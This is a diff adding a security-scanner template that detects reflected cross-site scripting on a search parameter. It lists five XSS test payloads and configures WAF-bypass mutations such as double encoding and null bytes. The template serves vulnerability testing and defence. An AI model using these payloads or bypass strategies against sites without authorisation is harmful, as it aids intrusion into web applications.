@@ -1,0 +1,33 @@
+id: reflected-xss-basic
+
+info:
+  name: Reflected XSS — Basic Detection
+  author: dalisecurity
+  severity: high
+  tags: [xss, reflected, owasp-top10]
+  description: Tests for reflected XSS via common URL parameters
+  reference:
+    - https://owasp.org/www-community/attacks/xss/
+  remediation: Implement output encoding and Content-Security-Policy headers
+  classification:
+    cwe-id: CWE-79
+
+http:
+  - method: GET
+    path: /search?q={{payload}}
+    payloads:
+      - '<script>alert(1)</script>'
+      - '<img src=x onerror=alert(1)>'
+      - "'\"><svg/onload=alert(1)>"
+      - '<details open ontoggle=alert(1)>'
+      - 'javascript:alert(1)//'
+    matchers:
+      - type: word
+        words: ['alert(1)']
+        part: body
+      - type: status
+        status: [200]
+    waf_bypass:
+      mutations: true
+      max_mutations: 5
+      strategies: [unicode_escape, html_entity, double_encode, case_swap, null_byte]
